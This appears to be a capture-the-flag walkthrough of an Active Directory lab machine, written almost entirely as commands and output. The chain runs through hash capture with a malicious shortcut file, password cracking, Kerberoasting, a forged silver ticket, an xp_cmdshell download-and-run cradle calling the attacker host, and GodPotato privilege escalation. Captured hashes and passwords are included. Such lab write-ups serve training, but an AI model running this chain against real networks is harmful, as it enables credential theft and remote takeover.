```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-02 08:48:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T08:24:04
|_Not valid after:  2054-08-02T08:24:04
|_ssl-date: 2024-08-02T08:48:52+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-02T08:48:52+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-02T08:48:12+00:00
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2024-08-01T08:23:01
|_Not valid after:  2025-01-31T08:23:01
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-02T08:48:14
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

Writable Share
```sh
smbclient //$t/share -U = "Guest"
```

#Capturing_hash
```sh
responder --interface "tun0" -wd
```
- Create a malicious ink  that connect to our responder .
```sh
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
$lnk.TargetPath = "\\10.8.3.12\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Malicious.ink"))
```

```sh
TAAAAAEUAgAAAAAAwAAAAAAAAEbEAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAQAAAE8GAAAAAAAAAAAAAE4AQgByAG8AdwBzAGkAbgBnACAAdABvACAAdABoAGUAIABkAGkAcgAgAHQAaABpAHMAIABmAGkAbABlACAAbABpAHYAZQBzACAAaQBuACAAdwBpAGwAbAAgAHAAZQByAGYAbwByAG0AIABhAG4AIABhAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIAByAGUAcQB1AGUAcwB0AC4AHQAlAHcAaQBuAGQAaQByACUAXABzAHkAcwB0AGUAbQAzADIAXABzAGgAZQBsAGwAMwAyAC4AZABsAGwA7gAAAAwAAKAUAB9YDRos8CG+UEOIsHNn/JbvPLMAAACtALuvkzufAAQAAAAAAC0AAAAxU1BTc0PlCr5DrU+F5GnchjOYbhEAAAALAAAAAAsAAAD//wAAAAAAAEEAAAAxU1BTMPElt+9HGhCl8QJgjJ7rrCUAAAAKAAAAAB8AAAAKAAAAMQAwAC4AOAAuADMALgAxADIAAAAAAAAALQAAADFTUFM6pL3eszeDQ5HnRJjaKZWrEQAAAAMAAAAAEwAAAAAAAAAAAAAAAAAAAAAAHQDDAABcXDEwLjguMy4xMlxAdGhyZWF0LnBuZwAAABQDAAABAACgXFwxMC44LjMuMTJcQHRocmVhdC5wbmcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABcAFwAMQAwAC4AOAAuADMALgAxADIAXABAAHQAaAByAGUAYQB0AC4AcABuAGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
```

- Transfert to our machine and upload it into the share `share\transfert`
```
[SMB] NTLMv2-SSP Client   : 10.10.107.17
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:1122334455667788:B4BCED802A722B8FC26FBD8FBF017EBC:0101000000000000804CB1E3D7E4DA014C704BA79381D1A70000000002000800460038005100310001001E00570049004E002D0057004E00420046004900430053004F0051004500530004003400570049004E002D0057004E00420046004900430053004F005100450053002E0046003800510031002E004C004F00430041004C000300140046003800510031002E004C004F00430041004C000500140046003800510031002E004C004F00430041004C0007000800804CB1E3D7E4DA010600040002000000080030003000000000000000010000000020000000C2A2EFBF44EF69D72B2D1FB4001F1F6E993EDCB2246C145A68A21868A59C280A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000
````

- Crack : 
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt  hash

Julia.Wong : Computer1
```

Users : 
```sh
svc_mssql
Christine.Bruce
Hugh.Watts
Jasmine.Slater
Lawrence.Kaur
George.Williams 
Jasmine.Price
Hilary.Reed
claire.pope
diana.pope
julia.wong
```

```sh
bloodhound-python -d 'breach.vl' -u 'Julia.Wong' -p 'Computer1' -ns $t -dc BREACHDC.breach.vl -c all
```

User VL{5ad5861a4669ba18796ea4513a6a892b}

Found an NTLM hashe : 
```sh
DFBE70A7E5CC19A398EBF1B96859CE5D
```

- Kerberoastable user :
```
GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t
```

```sh
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 11:43:08.106169  2024-08-02 16:20:40.486466



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$7b234ef22551c3249657af73cb4e56f5$8ed89cd70013f4af73b57effd6b2933119afe2ec359158f0c38b246a1dd20207d44a71312df630d8d136debd616685d9947b7c53b4189521d82f27ef8552e2973bcc8ee934543afb245e391825b44dcf7bb66f09770ab04632c5757b294b68a427882713cba63e5e140b9b90d3a8da24c81c1b5b534a062efdce84f96c066a3fe7eb4afe25f229c951cd60486efc68e82278c1aa34eeac6427d112c882203778c75031a623897e17997740e8caef00325eab8758ec0eb7fb5fff095f5b8447fefd5555c0ceb25aec341999643ccaf754caba9c70bcb7d6efbfa7b6b3f0e1e3ce686807ecfb857da788043d620f74bee2659047fd0ff3792285b50589e7c8eda8f063bb5328c3925f98e8f3e6ad7f6aea5eb76051814e8c96a53ac35bf4e044a63feb51d47f6da91bf7162d029d68eaecce2a3161c4969adb2509de1aaf99ec2de0f1eefa77daced469bc72aecf3d1bfb7226c2d1b3574a85a3f64423df2f9bfb2cd45d06b9677f78cbf9410e4b9687e511106d6259f7498649139000967975a2e7ff0a0f828d7204bf2745884879ae9b5d405eef7d038c1d13264205bad37dc5143ee69e34b8ba317345c51e8aef320cb6e0d9e78701fbc1427604e82d6d008d40ae53a56a0576914b0c499d74a949b143d82d56a774e712c7cb2ba8f5a5adb731a147d5ef41d6e040c703c0fc19fe2647f3ec5c68228865870b8b54804bde059d3c710963ed152978e1801687ad0bc6131deb427f05213c8c1c789fac7357011e08eb42443c771c24c7f6e28ade39d9c61d8388a270636953b3252738e9518cd4f1c70f861b5a2d8552eb6a721d4bc29a24194454b8e9b4253cccc733ca30eae84a9a62355c8522765121b255a99d8fbd9e29def4999b8ac67def0a7c8bb5a38949366076e2a75ba4fd03a47dbe6800ab26ec8d0bcb52504fb59197f3554eb3be577ddb7b1de9597ca890ded8d1779f7f5b11007912e7933b4809fc41cf72d7819f7beebe5c6bbb6676c048acb861bc91d189cfb1441947fc34b61f68171e858d6a063c739b2c0212270c6d64f96603c473afd87b33d65552782d0bf8205be4df82c3cae61a9bc459d1fdba248bbc5ed31b2a984422ae914525c4e2f09f7f15a9ecbf4f48381cfe565c72548d151c65211f41f0acfd6e9a41458cf906a1fff86eb38d1c937c2804e339a39ed58591a9061e633cd5aeba364c7f76ef28714dec0aade1df4da51d110b6238969753f2d69d6210f300796a039fb5d79bbe14e4ee6a3a66f39725d5c566f6016724f8c7f8517a1c9642c35b021a22908fd734e5c9c9223e1aecd681c4f735cae2c9c99f18cf18822bc167b65f635bf23fc9a9b9b3519d12faa8156b781b356530f82683971a292b81640901a25bf06d48d8bd901e69c548db755fcb464d5b92817c50a4f2780eef73f936e25ae29d910be9637e6463b0709832444865888fe3b584e9b8e94a6c3600

john --format=krb5tgs --wordlist= /usr/share/wordlists/rockyou.txt hash

svc_mssql : Trustno1
```

- Silver Ticket :
```sh
rpcclient $> lsaquery
Domain Name: BREACH
Domain Sid: S-1-5-21-2330692793-3312915120-706255856

ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip $t
-spn MSSQLSvc/breachdc.breach.vl:1433 -user administrator target

export KRB5CCNAME=MSSQLSvc.breachdc.breach.vl:1433.ccache

rdate -n $t

mssqlclient.py -k breachdc.breach.vl -no-pass -debug
#Eneable XP_cmdshell

xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString("http://10.8.3.12:8080/shell.ps1")

```

God Potatoe : 
```sh
godo.exe -cmd "cmd /c type c:\users\administrator\desktop\root.txt"
https://github.com/BeichenDream/GodPotato/releases
```
Root :  VL{069f8fe92a80b20151e0a5ffa1dc040c}

